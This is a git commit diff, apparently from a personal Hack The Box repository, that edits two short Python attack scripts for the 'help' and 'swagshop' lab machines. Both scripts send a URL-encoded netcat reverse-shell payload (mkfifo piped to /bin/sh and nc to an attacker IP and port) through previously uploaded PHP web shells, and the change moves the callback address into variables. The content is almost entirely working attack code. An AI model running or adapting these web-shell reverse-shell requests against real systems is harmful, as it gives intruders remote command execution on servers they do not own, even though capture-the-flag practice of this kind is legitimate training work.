90ec6f75f85b6c2a9f8d61092ac49079284e25fe
jinhao <jinhao_@hotmail.com>
2021-11-07 02:05:58 -0500

    updated

--- HTB/boxes/help/rce.py
+++ HTB/boxes/help/rce.py
@@ -1,8 +1,14 @@
 import requests
 
-payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%201337%20%3E%2Ftmp%2Ff%0A"
+ip = "10.10.14.8"
 
-url = "http://10.10.10.121/support/uploads/tickets/aec84976be3a37c00c0ab3811ab6ffd9.php?cmd=" + payload
+port = "1337"
+
+payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+ip+"%20"+port+"%20%3E%2Ftmp%2Ff%0A"
+
+hash = "373eec83bd8a1774bc0ec95f2c507786.php"
+
+url = "http://10.10.10.121/support/uploads/tickets/"+hash+"?cmd=" + payload
 
 r = requests.get(url)
 
--- HTB/boxes/swagshop/request_script.py
+++ HTB/boxes/swagshop/request_script.py
@@ -3,7 +3,10 @@ import requests
 
 url1 = "http://swagshop.htb/media/custom_options/quote/f/i/48e27235e3989227f6b26639439e9d6d.phtml?cmd=id"
 
-url = "http://swagshop.htb/media/custom_options/quote/f/i/48e27235e3989227f6b26639439e9d6d.phtml?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%204444%20%3E%2Ftmp%2Ff"
+ip = "10.10.14.8"
+port = "1337"
+
+url = "http://swagshop.htb/media/custom_options/quote/f/i/48e27235e3989227f6b26639439e9d6d.phtml?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+ip+"%20"+port+"%20%3E%2Ftmp%2Ff"
 
 
 r = requests.get(url)
